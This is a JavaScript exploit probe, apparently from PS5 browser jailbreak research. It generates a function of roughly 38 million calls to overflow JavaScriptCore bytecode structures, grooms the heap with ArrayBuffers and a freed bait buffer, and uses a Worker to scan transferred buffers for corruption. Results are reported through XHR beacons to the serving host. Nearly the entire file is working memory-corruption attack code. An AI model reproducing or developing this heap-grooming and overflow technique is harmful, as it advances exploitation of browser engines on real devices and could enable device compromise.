// p177 — Stopped sweep: throw at call #15000 to survive the overflow
//
// DIAGNOSIS: p176 proved sync XHR works on PS5. v175c got CALL but zero
// callbacks fired — not even CB-100 (within bounds). The function dies
// before its first op_call executes.
//
// THEORY: CodeBlock linking (lazy, on first call) crashes — either the
// 300MB+ bytecode copy OOMs, or MetadataTable init OOB-writes during linking.
//
// THIS PROBE: Two phases.
// Phase A: Call a TINY function (10 calls) with sync XHR callback → baseline
// Phase B: Call the overflow function with:
//   - Sync XHR at milestones: 1, 10, 100, 500, 893, 894, 1000, 5000, 10000
//   - Throw at call #15000 to stop the sweep and keep the page alive
//   - Worker scans ABs for corruption after the throw
//
// If Phase A works but Phase B gets zero callbacks → crash is during
// CodeBlock creation for the huge function (not during execution).
//
// Beacon prefix: V177-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag) {
    queue.push(tag);
    if (!sending) drain();
  }
  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var tag = queue.shift();
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V177-' + tag + '?t=' + Date.now(), true);
      x.onloadend = function() { setTimeout(drain, 15); };
      x.onerror = function() { setTimeout(drain, 15); };
      x.send();
    } catch(e) { setTimeout(drain, 15); }
  }
  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V177-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── Phase A: Tiny function baseline ──
  // Build a small function with 10 calls, prove callbacks work
  var tinyBody = 'window.__tiny=function(a){';
  for (var i = 0; i < 10; i++) tinyBody += 'a();';
  tinyBody += '};';
  eval(tinyBody);
  tinyBody = null;

  var tinyN = 0;
  try {
    window.__tiny(function() {
      tinyN++;
      if (tinyN <= 3) syncB('TINY-' + tinyN);
    });
  } catch(e) {
    B('TINY-EX-' + (e.message || '').substring(0, 20));
  }
  B('TINY-DONE-' + tinyN);

  // ── Heap setup: 40 × 100KB ABs, 1 bait ──
  var AB_SIZE = 102400;
  var N_TOTAL = 40;
  var allABs = [];
  try {
    for (var i = 0; i < N_TOTAL; i++) {
      allABs.push(new ArrayBuffer(AB_SIZE));
    }
  } catch(e) { B('OOM-' + allABs.length); }
  B('ALLOC-' + allABs.length);

  var baitAB = allABs[0];
  var runwayABs = allABs.slice(1);
  allABs = null;

  // ── Worker ──
  var workerCode = function() {
    var views = [];
    var baseUrl = '';
    var STRIDE = 112;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V177-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'buffers') {
        var abs = e.data.abs;
        for (var i = 0; i < abs.length; i++) views.push(new Uint8Array(abs[i]));
        beacon('BUFS-' + views.length);
        self.postMessage({ bufsReady: true });
        return;
      }
      if (e.data.cmd === 'scan') {
        // One-shot scan: called AFTER the sweep is stopped
        beacon('SCANNING');
        var hitBufs = 0;
        var hitEntries = 0;
        for (var bi = 0; bi < views.length; bi++) {
          var v = views[bi];
          var maxOff = v.length - STRIDE;
          var bufHits = 0;
          for (var off = 0; off <= maxOff; off += STRIDE) {
            if (v[off] !== 0 || v[off+4] !== 0 || v[off+8] !== 0 || v[off+12] !== 0) {
              bufHits++;
              if (hitEntries < 8) {
                // Dump 32 bytes of the entry
                var ent = '';
                for (var eb = 0; eb < 32; eb++) ent += hx(v[off+eb]);
                beacon('ENT-b' + bi + '-o' + off + '-' + ent);
                // Dump ValueProfile area (offset 88, 24 bytes)
                if (off + 112 <= v.length) {
                  var vp = '';
                  for (var vb = 88; vb < 112; vb++) vp += hx(v[off+vb]);
                  beacon('VP-b' + bi + '-o' + off + '-' + vp);
                }
              }
              hitEntries++;
            }
          }
          if (bufHits > 0) {
            hitBufs++;
            beacon('BF' + bi + '-' + bufHits);
          }
        }
        beacon('TOT-' + hitBufs + 'b-' + hitEntries + 'e');
        beacon('SCAN-DONE');
      }
    };
  };

  var watchBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var watcher = new Worker(URL.createObjectURL(watchBlob));
  watcher.postMessage({ cmd: 'init', baseUrl: BASE });

  var transferList = [];
  for (var i = 0; i < runwayABs.length; i++) transferList.push(runwayABs[i]);
  watcher.postMessage({ cmd: 'buffers', abs: runwayABs }, transferList);
  runwayABs = null;

  watcher.onmessage = function(e) {
    if (e.data.bufsReady) {
      B('XFER-OK');
      doFreeAndBuild();
    }
  };

  function doFreeAndBuild() {
    baitAB = null;
    B('BAIT-FREE');
    var gc = 0;
    function gcRound() {
      var trash = [];
      for (var j = 0; j < 50000; j++) trash.push({ x: gc, y: j });
      trash = null;
      gc++;
      if (gc < 20) setTimeout(gcRound, 30);
      else { B('GC-OK'); doBuild(); }
    }
    gcRound();
  }

  function doBuild() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v177=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v177ok=1;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'M');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMP-' + (window.__v177ok ? 'OK' : 'NO'));
      if (!window.__v177) { B('NOFN'); return; }

      setTimeout(function() {
        syncB('PRE-CALL');
        var n = 0;
        var STOP = 15000;
        var threw = false;
        try {
          window.__v177(function(){
            n++;
            if (n === 1 || n === 10 || n === 100 || n === 500 ||
                n === 893 || n === 894 || n === 895 || n === 1000 ||
                n === 5000 || n === 10000 || n === 15000) {
              syncB('CB-' + n);
            }
            if (n >= STOP) throw new Error('STOP');
          });
        } catch(ex) {
          threw = true;
          syncB('THREW-' + n);
        }
        syncB('POST-' + n + (threw ? '-T' : '-R'));

        // Trigger worker scan AFTER the sweep
        B('SCAN-REQ');
        watcher.postMessage({ cmd: 'scan' });
        B('ALIVE');
      }, 300);
    };

    sc.onerror = function() { B('SERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
